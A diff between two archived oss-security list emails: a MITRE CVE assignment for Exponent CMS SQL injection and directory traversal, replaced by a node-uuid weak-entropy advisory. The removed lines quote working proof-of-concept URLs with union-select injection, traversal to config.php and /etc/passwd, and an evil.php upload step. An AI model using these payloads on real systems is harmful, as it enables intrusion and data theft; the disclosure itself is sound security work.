@@ -1,66 +1,39 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/9
-Message-Id: <20160918170439.ADBAF42E002@smtpvbsrv1.mitre.org>
-Date: Sun, 18 Sep 2016 13:04:39 -0400 (EDT)
-From: cve-assign@...re.org
-To: felixk3y@...il.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/13/7
+Message-ID: <CANO=Ty0Am2OcAtzS5jH=xsVOP3o6pzCGmwHWm9igWOCpACpBPg@mail.gmail.com>
+Date: Wed, 13 Apr 2016 13:27:34 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security <oss-security@...ts.openwall.com>, CVE ID Requests <cve-assign@...re.org>
+Subject: CVE for nodejs node-uuid
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+https://nodesecurity.io/advisories/93
 
-> https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/pixidou/controllers/pixidouController.php#L83-L91
-> The "fid" parameter fail to sufficiently sanitize before using it in an SQL
-> query, In This vulnerability, also lead to Directory traversal, Remote code
-> execution vulnerabilities etc..
-> 
-> 1) Directory traversal vulnerability
-> http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
-> union select
-> 1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../framework/conf/config.php
-> 
-> 2) Remote code execution
->  i. Upload any legal files through website(.jpg|.gif etc..)
->  ii. copy file to evil file(.php etc..)
-> 
-> Proof of concept:
-> http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
-> union select
-> 1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../../../../../../../etc/passwd
-> 
-> And Now, The SQL Injection vulnerability have been fixed.
-> https://exponentcms.lighthouseapp.com/projects/61783/changesets/c1092f167cc6c78dc8bf9bf149946c5219413df3
-> https://github.com/exponentcms/exponent-cms/commit/c1092f167cc6c78dc8bf9bf149946c5219413df3
+Insecure Entropy Source - Math.random()
 
-Use CVE-2016-7452 for the directory traversal issue fixed by the
-"strpos($this->params['cpi'], '..')" check in
-c1092f167cc6c78dc8bf9bf149946c5219413df3.
+March 28th, 2016
+CVE-PENDING • Credit: Fedot Praslov
+node-uuid
+Vulnerable: <1.4.4
+Patched: >=1.4.4
+Overview
 
-Use CVE-2016-7453 for the SQL injection issue fixed by the
-intval($this->params['fid']) call in
-c1092f167cc6c78dc8bf9bf149946c5219413df3.
+node-uuid prior to 1.4.4 contained a bug that caused it to consistently
+fall back to using Math.random instead of a more cryptographically sound
+source of entropy, the native crypto module.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+Remediation
 
-iQIcBAEBCAAGBQJX3shtAAoJEHb/MwWLVhi21KwP/iyL/R3UtWIyGgsRLgYCHfiI
-UcLYWRA9eGFdm9cAeq+C5lJoyKkxjP6jeExQEE0o0jPR0wHcuya87JP8VYxjla0X
-QrsbtRk0N9bWLT9Hnt/AUXl4kRL4/V2rQu1dfdO5/ZT4/fu708qOyBOetVPPp+IY
-i9LteoDEsTeDs8LtF8vQjC9myYSP3uZVOW5yl1s3AmqbebUWHNYOUn5x0ts1h6mu
-4wAxXq7lBS0Lo/pi1OPBZGSlNJ06rgU6giksivSG9EuVQ2c9vngiJLOyGYFCB5kk
-xSHu4m51Wdg34QVlv3qibWtYp9Ni/72yUNpsYwTGZelh4khIRu7sou5Dy0VFKDCX
-elnFnjeF/zffE1hSTZz7Qf6bzikyHr6t7zfoh1Mob3GEc9BskjAuRcy4vS5D1NxK
-vF/ZXTuMA8fYmD83nY55kdGzOBr3rMV22gC2BpMTfAb/GklRTN9X5Jvr2GYQdIF7
-tiNWiq9XA63CrptuZ2iprItCKFNvEtH3O67U7b5ITAzQc8X66PgX9ZpwKAIJGDV8
-EOCycuetg4zUp7uglB5+dznodH404ky2TV0O45K8Bzt4cvh2CBEMNZwI8A4JLzxt
-IuyGjmVlSYEIDzDwK/VV9lHz0uOne5TOs7l5UVTVwk1LGUFWsD6LPyWAIujSplUl
-S56PM1ifmk+8oJ5eQK/e
-=Bayi
------END PGP SIGNATURE-----
+Upgrade to version 1.4.4 or greater
+
+References
+
+https://github.com/broofa/node-uuid/issues/108
+https://github.com/broofa/node-uuid/issues/122
+
+
+--
+Kurt Seifried -- Red Hat -- Product Security -- Cloud
+PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+Red Hat Product Security contact: secalert@...hat.com
+
